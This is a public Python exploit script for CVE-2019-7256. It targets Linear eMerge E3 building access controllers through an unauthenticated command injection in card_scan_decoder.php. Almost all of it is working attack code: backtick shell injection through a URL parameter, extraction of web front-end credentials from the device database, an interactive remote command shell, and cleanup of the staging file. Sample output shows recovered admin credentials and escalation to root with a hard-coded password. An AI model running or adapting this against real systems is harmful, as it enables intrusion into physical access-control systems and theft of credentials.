# Author: LiquidWorm
# Vendor Homepage: http://linear-solutions.com/nsc_family/e3-series/
# Software Link: http://linear-solutions.com/nsc_family/e3-series/
# Affected version: <=2.3.0a
# Advisory: https://applied-risk.com/resources/ar-2019-005
# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
# CVE: CVE-2019-7256

#!/usr/bin/env python
#
# Linear eMerge E3 Unauthenticated Command Injection Remote Root Exploit
# Affected version: <=1.00-06
# via card_scan_decoder.php
# CVE: CVE-2019-7256
# Advisory: https://applied-risk.com/resources/ar-2019-005
# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
#
# By Gjoko &#039;LiquidWorm&#039; Krstic
#
#########################################################################
# lqwrm@metalgear:~/stuff$ python emergeroot2.py 192.168.1.2
# Do you want me to try and get the web front-end credentials? (y/n) y
# ID=&#039;admin&#039;,Password=&#039;MakeLoveNotWar!&#039;
#
# lighttpd@192.168.1.2:/spider/web/webroot$ id
# uid=1003(lighttpd) gid=0(root)
#
# lighttpd@192.168.1.2:/spider/web/webroot$ cat /etc/version
# Software Version: 1.00.03
# Image: nxgcpub-image
# Built by: jenkins
#
# lighttpd@192.168.1.2:/spider/web/webroot$ echo davestyle |su -c id
# Password: 
# uid=0(root) gid=0(root) groups=0(root)
#
# lighttpd@192.168.1.2:/spider/web/webroot$ exit
#
# [+] Erasing read stage file and exiting...
# [+] Done. Ba-bye!
#
#########################################################################

import requests
import time####
import sys#####
import os######
import re######

piton = os.path.basename(sys.argv[0])

if len(sys.argv) < 2:
	print &#039;&#039;&#039;
                                         .....                              
                                    .e$$$$$$$$$$$$$$e.                      
                                  z$$ ^$$$$$$$$$$$$$$$$$.                   
                                .$$$* J$$$$$$$$$$$$$$$$$$$e                 
                               .$"  .$$$$$$$$$$$$$$$$$$$$$$*-               
                              .$  $$$$$$$$$$$$$$$$***$$  .ee"               
                 z**$$        $$r ^**$$$$$$$$$*" .e$$$$$$*"                 
                " -\e$$      4$$$$.         .ze$$$""""                      
               4 z$$$$$      $$$$$$$$$$$$$$$$$$$$"                          
               $$$$$$$$     .$$$$$$$$$$$**$$$$*"                            
             z$$"    $$     $$$$P*""     J$*$$c                             
            $$"      $$F   .$$$          $$ ^$$                             
           $$        *$$c.z$$$          $$   $$                             
          $P          $$$$$$$          4$F   4$                             
         dP            *$$$"           $$    &#039;$r                            
        .$                            J$"     $"                            
        $                             $P     4$                             
        F                            $$      4$                             
                                    4$%      4$                             
                                    $$       4$                             
                                   d$"       $$                             
                                   $P        $$                             
                                  $$         $$                             
                                 4$%         $$                             
                                 $$          $$                             
                                d$           $$                             
                                $F           "3                             
                         r=4e="  ...  ..rf   .  ""%                         
                        $**$*"^""=..^4*=4=^""  ^"""
  &#039;&#039;&#039;
	print &#039;\n\x20\x20[+] Linear eMerge E3 Remote Root Exploit&#039;
	print &#039;\x20\x20[-] by lqwrm (c) 2019&#039;
	print &#039;\n\x20\x20[*] Usage: &#039;+piton+&#039; <ipaddress:port>\n&#039;
	sys.exit()

ipaddr = sys.argv[1]

creds = raw_input(&#039;Do you want me to try and get the web front-end credentials? (y/n) &#039;)
if creds.strip() == &#039;y&#039;:
    frontend = &#039;&#039;&#039;grep "Controller" /tmp/SpiderDB/Spider.db |cut -f 5,6 -d &#039;,&#039; |grep ID&#039;&#039;&#039;
    requests.get(&#039;http://&#039;+ipaddr+&#039;/card_scan_decoder.php?No=30&door=%60&#039;+frontend+&#039; > test.txt%60&#039;)
    showme = requests.get(&#039;http://&#039;+ipaddr+&#039;/test.txt&#039;)
    print showme.text

while True:
	try:
		cmd = raw_input(&#039;lighttpd@&#039;+ipaddr+&#039;:/spider/web/webroot$ &#039;)
		execute = requests.get(&#039;http://&#039;+ipaddr+&#039;/card_scan_decoder.php?No=30&door=%60&#039;+cmd+&#039; > test.txt%60&#039;)
		#time.sleep(1);
		readreq = requests.get(&#039;http://&#039;+ipaddr+&#039;/test.txt&#039;)
		print readreq.text
		if cmd.strip() == &#039;exit&#039;:
			print "[+] Erasing read stage file and exiting..."
			requests.get(&#039;http://&#039;+ipaddr+&#039;/card_scan_decoder.php?No=30&ReaderNo=%60rm test.txt%60&#039;)
			print "[+] Done. Ba-bye!\n"
			break
		else: continue
	except Exception:
		break

sys.exit()

